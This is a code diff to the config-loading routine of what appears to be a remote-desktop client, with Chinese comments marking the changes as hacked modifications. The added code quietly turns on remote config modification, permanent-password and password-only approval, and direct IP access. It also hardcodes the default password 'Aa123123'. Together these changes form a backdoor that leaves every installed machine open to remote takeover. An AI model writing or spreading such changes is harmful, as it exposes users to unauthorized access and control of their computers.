@@ -459,6 +459,27 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+        //魔改将设置里的 安全-允许远程修改配置 默认打勾
+        if !config.options.contains_key("allow-remote-config-modification") {
+                config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+                store = true;
+            }
+        //魔改将设置里的【安全-密码】设置默认的固定密码
+        if !config.options.contains_key("verification-method") {
+                config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+                store = true;
+        }
+        //魔改将设置里的【安全-密码】改为成【只允许密码访问】方式
+        if !config.options.contains_key("approve-mode") {
+                config.options.insert("approve-mode".to_string(), "password".to_string());
+                store = true;
+        }
+         //魔改允许IP直连 
+        if !config.options.contains_key("direct-server") {
+                config.options.insert("direct-server".to_string(), "Y".to_string());
+                store = true;
+        }
+
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -470,6 +491,9 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+
+        
+        
         if store {
             config.store();
         }
@@ -598,6 +622,11 @@ impl Config {
                     log::error!("Failed to generate new id");
                 }
             }
+        }
+        //魔改设定固定的密码
+        if config.password.is_empty() {
+                    config.password = "Aa123123".to_string();
+                    store = true;
         }
         if store {
             config.store();
